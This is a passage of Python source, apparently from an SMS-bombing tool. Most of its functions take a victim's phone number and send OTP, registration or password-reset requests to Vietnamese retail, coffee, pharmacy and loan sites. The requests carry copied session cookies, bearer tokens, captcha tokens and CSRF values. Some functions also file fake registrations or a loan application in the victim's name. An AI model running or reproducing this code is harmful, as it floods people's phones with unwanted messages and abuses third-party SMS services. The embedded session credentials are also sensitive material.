        "aeon-vn-prodnxweb.sid": "Fe26.2**e73fc98d48119055e55e92e210ee357aa2d9c9949681abc82674fcb87a5642c6*1SHq0qaHGfIvhRnGrZHCuA*Mz1dgQQQnkKAUqZ6xU-AqWge5bjsVGY9cMUIfcma5FSY74ZN_W535WxBQmtb4_iN**711712822eacdc90f2ad1d9e074bce9d4745edd8fe8245e7a2607e30406b813c*dZeCE-JvH-5u_6morG5kBUEmYdlQ6zCwzKc-RJoXgws",
        "datadome": "P1Bjw0mcEMg4xkkqDrkl64vJgfqLJeWym5C31i2bA_JgFj9q6hE76K2kzcofBcNNjU~u7100TNQwg2cSbvKUUnM0iGp~bNBrOyfdk2yod0LHT8egu642C41u4_4MlN3I",
        "_ga_DSESGQJZC8": "GS1.1.1737791246.3.0.1737791256.50.0.0",
        "superSession": "{%22id%22:%22fdfc9b51-1d98-4d12-b611-cf54991198de-1737791246813%22%2C%22expiry%22:1737793088241}",
        "_dd_s": "rum=0&expire=1737792211132",
    }
    headers = {
        "accept": "*/*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6",
        "api-json": "true",
        "content-type": "application/json",
        # 'cookie': 'deviceId=fdfc9b51-1d98-4d12-b611-cf54991198de; spressoDeviceId=68f5c65e-be52-4f78-b959-3069ee047dcf; _gcl_au=1.1.921902336.1734755384; _ga=GA1.1.1317301966.1734755385; _ym_uid=1734755386535677074; _ym_d=1734755386; i18next=vi-VN; locationCaptured=true; crumb=g4sZNpK6kYgW2JZibSQlgWBr-gxbTCXCl-4C4aSibum; locationIdentifierIds=6476ec32b597582eddf0df29; selectedCity=Th%C3%A0nh%20ph%E1%BB%91%20H%E1%BB%93%20Ch%C3%AD%20Minh; selectedDistrict=Qu%E1%BA%ADn%2001; selectedWard=Ph%C6%B0%E1%BB%9Dng%20B%E1%BA%BFn%20Ngh%C3%A9; _ym_isad=1; _ym_visorc=w; aeon-vn-prodnxweb.sid=Fe26.2**e73fc98d48119055e55e92e210ee357aa2d9c9949681abc82674fcb87a5642c6*1SHq0qaHGfIvhRnGrZHCuA*Mz1dgQQQnkKAUqZ6xU-AqWge5bjsVGY9cMUIfcma5FSY74ZN_W535WxBQmtb4_iN**711712822eacdc90f2ad1d9e074bce9d4745edd8fe8245e7a2607e30406b813c*dZeCE-JvH-5u_6morG5kBUEmYdlQ6zCwzKc-RJoXgws; datadome=P1Bjw0mcEMg4xkkqDrkl64vJgfqLJeWym5C31i2bA_JgFj9q6hE76K2kzcofBcNNjU~u7100TNQwg2cSbvKUUnM0iGp~bNBrOyfdk2yod0LHT8egu642C41u4_4MlN3I; _ga_DSESGQJZC8=GS1.1.1737791246.3.0.1737791256.50.0.0; superSession={%22id%22:%22fdfc9b51-1d98-4d12-b611-cf54991198de-1737791246813%22%2C%22expiry%22:1737793088241}; _dd_s=rum=0&expire=1737792211132',
        "origin": "https://aeoneshop.com",
        "priority": "u=1, i",
        "referer": "https://aeoneshop.com/",
        "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "x-csrf-token": "g4sZNpK6kYgW2JZibSQlgWBr-gxbTCXCl-4C4aSibum",
    }
    json_data = {
        "email": "sssgsggsgg@gmail.com",
        "phone": phone,
        "type": "userRegistration",
    }
    response = requests.post(
        "https://aeoneshop.com/api/issue-otp",
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
def robot(phone):
    cookies = {
        "_fbp": "fb.1.1720102725444.358598086701375218",
        "_gcl_au": "1.1.619229570.1720102726",
        "mousestats_vi": "acaa606972ae539932c0",
        "_tt_enable_cookie": "1",
        "_ttp": "tGf0fClVBAWb7n4wsYwyYbdPx5W",
        "_ym_uid": "1720102728534641572",
        "_ym_d": "1720102728",
        "_gid": "GA1.2.557208002.1720622172",
        "_clck": "14x7a16%7C2%7Cfnc%7C0%7C1646",
        "_ym_isad": "2",
        "__cfruid": "92805d7d62cc6333c3436c959ecc099040706b4f-1720628273",
        "_ym_visorc": "w",
        "XSRF-TOKEN": "eyJpdiI6IjJUcUxmYUFZY3ZGR3hFVFFGS2QybkE9PSIsInZhbHVlIjoidWVYSDZTZmVKOWZ0MFVrQnJ0VHFMOUZEdkcvUXZtQzBsTUhPRXg2Z0FWejV0U3grbzVHUUl6TG13Z09PWjhMQURWN0pkRFl4bzI3Nm9nQTdFUm5HTjN2TFd2NkExTlQ5RjUwZ1hGZEpDaUFDUTkxRVpwRzdTdWhoVElNRVYvbzgiLCJtYWMiOiI0ZTU0MWY5ZDI2NGI3MmU3ZGQwMDIzMjNiYjJjZDUyZjIzNjdkZjc0ODFhNWVkMTdhZWQ0NTJiNDgxY2ZkMDczIiwidGFnIjoiIn0%3D",
        "sessionid": "eyJpdiI6InBWUDRIMVE1bUNtTk5CN0htRk4yQVE9PSIsInZhbHVlIjoiMGJwSU1VOER4ZnNlSCt1L0Vjckp0akliMWZYd1lXaU01K08ybXRYOWtpb2theFdzSzBENnVzWUdmczFQNzN1YU53Uk1hUk1lZWVYM25sQ0ZwbytEQldGcCthdUR4S29sVHI3SVRKcEZHRndobTlKcWx2QVlCejJPclc1dkU1bmciLCJtYWMiOiJiOTliN2NkNmY5ZDFkNTZlN2VhODg3NWIxMmEzZmVlNzRmZjU1ZGFmZWYxMzI0ZWYwNDNmMWZmMDljNmMzZDdhIiwidGFnIjoiIn0%3D",
        "utm_uid": "eyJpdiI6IlFPQ2UydEhQbC8zbms5ZER4M2t5WWc9PSIsInZhbHVlIjoiaWlBdVppVG9QRjhEeVJDRmhYUGUvRWpMMzNpZHhTY1czTWptMDYvK2VERVFhYzFEaDV1clJBczZ2VzlOSW1YR3dVMDRRUHNYQkMvYWRndS9Kekl5KzhlNU1Xblk5NHVjdmZEcjRKNVE5RXI3cnp0MzJSd3hOVVYyTHNMMDZuT0UiLCJtYWMiOiIyOGVmNGM1NmIyZmZlNTMzZmI5OWIxYzI2NjI3Yzg2Yjg0YTAwODMxMjlkMDE0ZTU3MjVmZTViMjc5MDM1YTE4IiwidGFnIjoiIn0%3D",
        "_ga": "GA1.2.1882430469.1720102726",
        "ec_png_utm": "12044e63-ea79-83c1-269a-86ba3fc88165",
        "ec_png_client": "false",
        "ec_png_client_utm": "null",
        "ec_cache_utm": "12044e63-ea79-83c1-269a-86ba3fc88165",
        "ec_cache_client": "false",
        "ec_cache_client_utm": "null",
        "ec_etag_client": "false",
        "ec_etag_utm": "12044e63-ea79-83c1-269a-86ba3fc88165",
        "ec_etag_client_utm": "null",
        "_clsk": "1kt5hyl%7C1720628299918%7C2%7C1%7Cx.clarity.ms%2Fcollect",
        "_ga_EBK41LH7H5": "GS1.1.1720622171.4.1.1720628300.41.0.0",
        "uid": "12044e63-ea79-83c1-269a-86ba3fc88165",
        "client": "false",
        "client_utm": "null",
    }
    headers = {
        "accept": "*/*",
        "accept-language": "vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "cache-control": "no-cache",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        # 'cookie': '_fbp=fb.1.1720102725444.358598086701375218; _gcl_au=1.1.619229570.1720102726; mousestats_vi=acaa606972ae539932c0; _tt_enable_cookie=1; _ttp=tGf0fClVBAWb7n4wsYwyYbdPx5W; _ym_uid=1720102728534641572; _ym_d=1720102728; _gid=GA1.2.557208002.1720622172; _clck=14x7a16%7C2%7Cfnc%7C0%7C1646; _ym_isad=2; __cfruid=92805d7d62cc6333c3436c959ecc099040706b4f-1720628273; _ym_visorc=w; XSRF-TOKEN=eyJpdiI6IjJUcUxmYUFZY3ZGR3hFVFFGS2QybkE9PSIsInZhbHVlIjoidWVYSDZTZmVKOWZ0MFVrQnJ0VHFMOUZEdkcvUXZtQzBsTUhPRXg2Z0FWejV0U3grbzVHUUl6TG13Z09PWjhMQURWN0pkRFl4bzI3Nm9nQTdFUm5HTjN2TFd2NkExTlQ5RjUwZ1hGZEpDaUFDUTkxRVpwRzdTdWhoVElNRVYvbzgiLCJtYWMiOiI0ZTU0MWY5ZDI2NGI3MmU3ZGQwMDIzMjNiYjJjZDUyZjIzNjdkZjc0ODFhNWVkMTdhZWQ0NTJiNDgxY2ZkMDczIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6InBWUDRIMVE1bUNtTk5CN0htRk4yQVE9PSIsInZhbHVlIjoiMGJwSU1VOER4ZnNlSCt1L0Vjckp0akliMWZYd1lXaU01K08ybXRYOWtpb2theFdzSzBENnVzWUdmczFQNzN1YU53Uk1hUk1lZWVYM25sQ0ZwbytEQldGcCthdUR4S29sVHI3SVRKcEZHRndobTlKcWx2QVlCejJPclc1dkU1bmciLCJtYWMiOiJiOTliN2NkNmY5ZDFkNTZlN2VhODg3NWIxMmEzZmVlNzRmZjU1ZGFmZWYxMzI0ZWYwNDNmMWZmMDljNmMzZDdhIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IlFPQ2UydEhQbC8zbms5ZER4M2t5WWc9PSIsInZhbHVlIjoiaWlBdVppVG9QRjhEeVJDRmhYUGUvRWpMMzNpZHhTY1czTWptMDYvK2VERVFhYzFEaDV1clJBczZ2VzlOSW1YR3dVMDRRUHNYQkMvYWRndS9Kekl5KzhlNU1Xblk5NHVjdmZEcjRKNVE5RXI3cnp0MzJSd3hOVVYyTHNMMDZuT0UiLCJtYWMiOiIyOGVmNGM1NmIyZmZlNTMzZmI5OWIxYzI2NjI3Yzg2Yjg0YTAwODMxMjlkMDE0ZTU3MjVmZTViMjc5MDM1YTE4IiwidGFnIjoiIn0%3D; _ga=GA1.2.1882430469.1720102726; ec_png_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_png_client=false; ec_png_client_utm=null; ec_cache_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_cache_client=false; ec_cache_client_utm=null; ec_etag_client=false; ec_etag_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_etag_client_utm=null; _clsk=1kt5hyl%7C1720628299918%7C2%7C1%7Cx.clarity.ms%2Fcollect; _ga_EBK41LH7H5=GS1.1.1720622171.4.1.1720628300.41.0.0; uid=12044e63-ea79-83c1-269a-86ba3fc88165; client=false; client_utm=null',
        "origin": "https://vietloan.vn",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://vietloan.vn/register",
        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }
    data = {
        "phone": phone,
        "_token": "0fgGIpezZElNb6On3gIr9jwFGxdY64YGrF8bAeNU",
    }
    response = requests.post(
        "https://vietloan.vn/register/phone-resend",
        cookies=cookies,
        headers=headers,
        data=data,
    )
def dkimu(phone):
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "Authorization": "Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Origin": "https://mutosi.com",
        "Pragma": "no-cache",
        "Referer": "https://mutosi.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    json_data = {
        "name": "hà khải",
        "phone": phone,
        "password": "Vjyy1234@",
        "confirm_password": "Vjyy1234@",
        "firstname": None,
        "lastname": None,
        "verify_otp": 0,
        "store_token": "226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b",
        "email": "dđ@gmail.com",
        "birthday": "2006-02-13",
        "accept_the_terms": 1,
        "receive_promotion": 1,
    }
    response = requests.post(
        "https://api-omni.mutosi.com/client/auth/register",
        headers=headers,
        json=json_data,
    )
def otpmu(phone):
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "Authorization": "Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Origin": "https://mutosi.com",
        "Pragma": "no-cache",
        "Referer": "https://mutosi.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    json_data = {
        "phone": phone,
        "token": "03AFcWeA4O6j16gs8gKD9Zvb-gkvoC-kBTVH1xtMZrMmjfODRDkXlTkAzqS6z0cT_96PI4W-sLoELf2xrLnCpN0YvCs3q90pa8Hq52u2dIqknP5o7ZY-5isVxiouDyBbtPsQEzaVdXm0KXmAYPn0K-wy1rKYSAQWm96AVyKwsoAlFoWpgFeTHt_-J8cGBmpWcVcmOPg-D4-EirZ5J1cAGs6UtmKW9PkVZRHHwqX-tIv59digmt-KuxGcytzrCiuGqv6Rk8H52tiVzyNTtQRg6JmLpxe7VCfXEqJarPiR15tcxoo1RamCtFMkwesLd39wHBDHxoyiUah0P4NLbqHU1KYISeKbGiuZKB2baetxWItDkfZ5RCWIt5vcXXeF0TF7EkTQt635L7r1wc4O4p1I-vwapHFcBoWSStMOdjQPIokkGGo9EE-APAfAtWQjZXc4H7W3Aaj0mTLpRpZBV0TE9BssughbVXkj5JtekaSOrjrqnU0tKeNOnGv25iCg11IplsxBSr846YvJxIJqhTvoY6qbpFZymJgFe53vwtJhRktA3jGEkCFRdpFmtw6IMbfgaFxGsrMb2wkl6armSvVyxx9YKRYkwNCezXzRghV8ZtLHzKwbFgA6ESFRoIHwDIRuup4Da2Bxq4f2351XamwzEQnha6ekDE2GJbTw",
        "source": "web_consumers",
    }
    response = requests.post(
        "https://api-omni.mutosi.com/client/auth/reset-password/send-phone",
        headers=headers,
        json=json_data,
    )
def lote(phone):
    cookies = {
        "__Host-next-auth.csrf-token": "2c95aedbe3b2a7070c6b91899b2ae8c85931edffbc5f53bf3ceaa177f1a204be%7C5b2082aa598f7c2d9802014b5fabfcd523af03e4738af10baf6ca96063c440b6",
        "__Secure-next-auth.callback-url": "https%3A%2F%2Fwww.lottemart.vn",
        "_gcl_au": "1.1.2136712951.1720299022",
        "_ga": "GA1.1.164372556.1720299023",
        "_fbp": "fb.1.1720299024438.549668172235070425",
        "_ga_6QLJ7DM4XW": "GS1.1.1720299022.1.1.1720299051.31.0.0",
    }
    headers = {
        "accept": "application/json",
        "accept-language": "vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "cache-control": "no-cache",
        "content-type": "application/json",
        # 'cookie': '__Host-next-auth.csrf-token=2c95aedbe3b2a7070c6b91899b2ae8c85931edffbc5f53bf3ceaa177f1a204be%7C5b2082aa598f7c2d9802014b5fabfcd523af03e4738af10baf6ca96063c440b6; __Secure-next-auth.callback-url=https%3A%2F%2Fwww.lottemart.vn; _gcl_au=1.1.2136712951.1720299022; _ga=GA1.1.164372556.1720299023; _fbp=fb.1.1720299024438.549668172235070425; _ga_6QLJ7DM4XW=GS1.1.1720299022.1.1.1720299051.31.0.0',
        "origin": "https://www.lottemart.vn",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://www.lottemart.vn/signup?callbackUrl=https://www.lottemart.vn/",
        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    }
    json_data = {
        "username": phone,
        "case": "register",
    }
    response = requests.post(
        "https://www.lottemart.vn/v1/p/mart/bos/vi_nsg/V1/mart-sms/sendotp",
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
def upos(phone):
    url = f"https://upos.vn/vn/home/send_brandname_otp/{phone}"
    response = requests.get(url)
def foodmap1(phone):
    url = f"https://foodmap.asia/register/check-phone/send-otp/{phone}/null/false/zalo"
    response = requests.get(url)
def thuongdo(phone):
    url = f"https://api-client.hangve.com/api/auth/reset-password/by-phone/{phone}"
    response = requests.get(url)
def unicar(phone):
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6",
        "content-type": "application/json",
        "origin": "https://unicar.com.vn",
        "priority": "u=1, i",
        "referer": "https://unicar.com.vn/",
        "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    }
    json_data = {
        "phoneNumber": phone,
        "app": "xoomw",
        "v": "w36.15.2",
    }
    response = requests.post(
        "https://api.unicar.vn/uauth/login_phone", headers=headers, json=json_data
    )
def highlands(phone):
    cookies = {
        ".diadiem.Session": "CfDJ8PoFpWVp%2FpdMhR9HbDRDTjvQ3P9oiWq7sLAZDIAEIJQkq1BCCexcaXOOw8h2osc2O%2B%2BbBmX%2F9TgsuKk35ZhirG%2B%2BZ0OyTD6CoQLnnRPN3I%2BtfIDD%2BJr70J8%2F9XnoUu0%2B%2BkcY2YLmrP0lKTsNgRvIhNFewRV0rfR7gdO7zje9PxnU",
        "route": "1734771032.298.37.687218|d5b38695e274be05122762aeb7f81e07",
    }
    headers = {
        "Host": "api-app.highlandscoffee.com.vn",
        # 'Cookie': '.diadiem.Session=CfDJ8PoFpWVp%2FpdMhR9HbDRDTjvQ3P9oiWq7sLAZDIAEIJQkq1BCCexcaXOOw8h2osc2O%2B%2BbBmX%2F9TgsuKk35ZhirG%2B%2BZ0OyTD6CoQLnnRPN3I%2BtfIDD%2BJr70J8%2F9XnoUu0%2B%2BkcY2YLmrP0lKTsNgRvIhNFewRV0rfR7gdO7zje9PxnU; route=1734771032.298.37.687218|d5b38695e274be05122762aeb7f81e07',
        "content-type": "application/json",
        "accept": "application/json",
        "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjBhYmUxZmFlLWI4YzUtNDhmYy1iYzhjLTVlOTA5ODNjY2VmNyJ9.eyJVc2VyR3VpZCI6IkN1c3RvbWVyLzIiLCJEZXZpY2VHdWlkIjoiRGV2aWNlLzQiLCJMb2NhdGlvbkd1aWQiOiJMb2NhdGlvbi80IiwiS2V5RGV2aWNlIjoiRTJWQy1KTUwzLTRXWFEiLCJEZXZpY2VUeXBlIjoiMSIsIm5iZiI6MTczNDc3MTAyMCwiZXhwIjoxNzM3OTY3ODIwLCJpYXQiOjE3MzQ3NzEwMjAsImlzcyI6Imh0dHBzOi8vYXBpLWFwcC5oaWdobGFuZHNjb2ZmZWUuY29tLnZuIiwiYXVkIjoiaHR0cHM6Ly9hcGktYXBwLmhpZ2hsYW5kc2NvZmZlZS5jb20udm4ifQ.s1f5aqFBATZGDqgA69uFYle-UsEH_4mqdb8-3euaRXk",
        "x-auth-checksum": "14129e5f51e48ae7ff9d12116c80e1d33bf2c56e355412683ca33c17732e6012",
        "x-auth-timestamp": "1734771031306",
        "accept-language": "vi",
        "x-auth-signature": "b75377e9453f0644fce99ba40305dd1cf3371438cd03f36e92c4da19f3ca7493",
        "user-agent": "PendoGO/4.1.15 (com.vti.highlands; build:1; iOS 15.8.2) Alamofire/5.9.1",
        "x-auth-nonce": "1734771031306155",
        "x-auth-devicecode": "E2VC-JML3-4WXQ",
    }
    json_data = {
        "UserAccount": phone,
    }
    response = requests.post(
        "https://api-app.highlandscoffee.com.vn/api/v3/authentication/otp/send",
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
def h5vay(phone):
    cookies = {
        "JSESSIONID": "44F3DE8B56B8D4A9A50B52BD75F00723",
    }
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "Connection": "keep-alive",
        "Content-Language": "vn",
        "Content-Type": "application/json",
        # 'Cookie': 'JSESSIONID=44F3DE8B56B8D4A9A50B52BD75F00723',
        "Origin": "https://h5.govaydong.com",
        "Referer": "https://h5.govaydong.com/login",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "appcodename": "Mozilla",
        "appname": "Netscape",
        "appversion": "5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "channel": "",
        "deviceType": "h5",
        "h": "2400.75",
        "platform": "Linux armv81",
        "screenresolution": "1080.75,2400.75",
        "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="124"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "system": "android",
        "vendor": "Google Inc.",
        "w": "1080.75",
    }
    json_data = {
        "phone": phone,
        "type": 2,
        "timestamp": 1737416615579,
        "referrer": "utm_source=null",
        "af_prt": None,
        "sign": "0f656af82eb1da33221a06d1171db265",
        "appversion": "1.0.0",
        "channel": "1",
        "app_version": "1.0.0",
        "version": "1.0.0",
        "imei": "24313ac76414f67ee311fceb02009c11",
        "uuid": "24313ac76414f67ee311fceb02009c11",
        "pkg_name": "com.qcloan.vay24h5",
    }
    response = requests.post(
        "https://h5.govaydong.com/api/register/app/sendSms",
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
def gas40(phone):
    cookies = {
        "Gas4.0UserId": "51f88088-12b1-41f0-9416-4fccd1743b7e",
        "__Gas4.0UserRegion": "CANTHO",
    }
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6",
        # 'cookie': 'Gas4.0UserId=51f88088-12b1-41f0-9416-4fccd1743b7e; __Gas4.0UserRegion=CANTHO',
        "origin": "https://gas40.com",
        "priority": "u=1, i",
        "referer": "https://gas40.com/",
        "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    }
    params = {
        "phone": phone,
    }
    response = requests.get(
        "https://ecom.viettechsmart.com:5020/api/Calls/OTP",
        params=params,
        cookies=cookies,
        headers=headers,
    )
def finzone(phone):
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6",
        "captchatoken": "03AFcWeA6tooBO3Q-Vcug2TPt9h9-HZCR3zjxarHr68OSGc5xWsvVPH6bPDS7TnH3uga1j3UCEXvwBGl8crFIj3Z1UC3206VTZazHZCdIGXQ8CiPKSvhhw_Q4x1mQ5uzAoWgKXDS5_NjcmEcy3bWMwEFn3plfOMCwg2X0wyTEba7fWgel4ELLOjwDPDclLYulPkD_OjaoeXDSMJt9Nzk8_VrCmKYYVLVdMSImo2VsarVE53LW3SJ6_fk5G6A8lGpfz-i9M2zdLVjg7pEOJ7uwzi56Kz8yFxz92j5SZjmqk7S3NsbuV8DwEvraKu1rAMiNM0IjS5BrDxX41eY_iBxUJGkpj0JlMcISsJEhq39tpHF9-ZASrg_GIkhWPiCHQYiGcWG2rDbTi_AuC9vo787OOO-uGZjETA9Y9UEbKRcb5h0wgo3ufjbmRNM-JSU7FKlWD7ssiTqm5IuM-MOdkZ4Yg_78zF1ZwiOWbXPYZjL6jkG_QG2QSE6MNWlQE_jTcy_w19fcec2KhuU3Z8C_8aAA94KdLWzO3KvM16FoSm8rTdYI0D7XTYj2-eSnCTO-PjadPBKlhvrV87kxWRNh71xO-wAEwiIcdqYv0whcZ5RDt6He5svhId9m6rhF2n6THcjfPz28162wse54GE1nOhBjgm6gYMeLLJ3qyE6ISM5M7GNAjSz0T7n1qCq9wK30E708AulFNizab1NKIvft68g0M-O6sX-iRvwSGF-uvv2g919K0_dFiMVwVV1hq4ySASXFqBlDZL5U7EHD7N56pQ54zy6CdP25I7W_SjoKUHHyVxGasC4o0surkxEXFAIZiIbtv-6JH89RbsURBtiZVcY6S3c2PiF2AXNR-kK1mi_xbRcI5hbyPbe_31S2XylFGFyNF8nhjmgXCRfo6ddzSPODPGp7DEexKg1abVQ",
        "content-type": "application/json",
        "origin": "https://finzone.vn",
        "priority": "u=1, i",
        "referer": "https://finzone.vn/",
        "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    }
    json_data = {
        "phone_number": phone,
        "loan_period": 6,
        "loan_purpose": "consumer_loan",
        "expected_amount": 20000000,
        "device_id": "26ebfc3ef2750940c153c9f8c15d126c.1e1606bcd85a88bf6db102db745a6885",
        "tracking_params": {
            "formId": "a23ca2e8-e2d0-4b21-a438-2ef51245872c",
        },
        "device_info": {
            "os": "unknown",
            "browser": "unknown",
        },
        "consent_id": "425edf86-2fdc-4fb1-b44c-eddf4868e92b",
    }
    response = requests.post(
        "https://api.finzone.vn/upl/new", headers=headers, json=json_data
    )
def pharmart1(phone):
    cookies = {
        "bppsession2021": "9m74ec12o7n3rodrb4chpg0vscl3ol0m",
        "isAT": "0",
        "_gcl_au": "1.1.850921550.1737988343",
        "_ga": "GA1.1.1093851254.1737988343",
        "_tt_enable_cookie": "1",
        "_ttp": "4D0CKcX7-DGcl03mbLdWH9hL4aW.tt.1",
        "_clck": "w96d30%7C2%7Cfsx%7C0%7C1853",
        "_clsk": "1bgzv52%7C1737988345477%7C1%7C1%7Cq.clarity.ms%2Fcollect",
        "_ga_15NTZ9D0S2": "GS1.1.1737988343.1.1.1737988464.60.0.0",
    }
    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        # 'cookie': 'bppsession2021=9m74ec12o7n3rodrb4chpg0vscl3ol0m; isAT=0; _gcl_au=1.1.850921550.1737988343; _ga=GA1.1.1093851254.1737988343; _tt_enable_cookie=1; _ttp=4D0CKcX7-DGcl03mbLdWH9hL4aW.tt.1; _clck=w96d30%7C2%7Cfsx%7C0%7C1853; _clsk=1bgzv52%7C1737988345477%7C1%7C1%7Cq.clarity.ms%2Fcollect; _ga_15NTZ9D0S2=GS1.1.1737988343.1.1.1737988464.60.0.0',
        "origin": "https://www.pharmart.vn",
        "priority": "u=1, i",
        "referer": "https://www.pharmart.vn/",
        "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }
    data = {
        "phone": phone,
        "type": "sms",
    }
    response = requests.post(
        "https://www.pharmart.vn/send-otp", cookies=cookies, headers=headers, data=data
    )
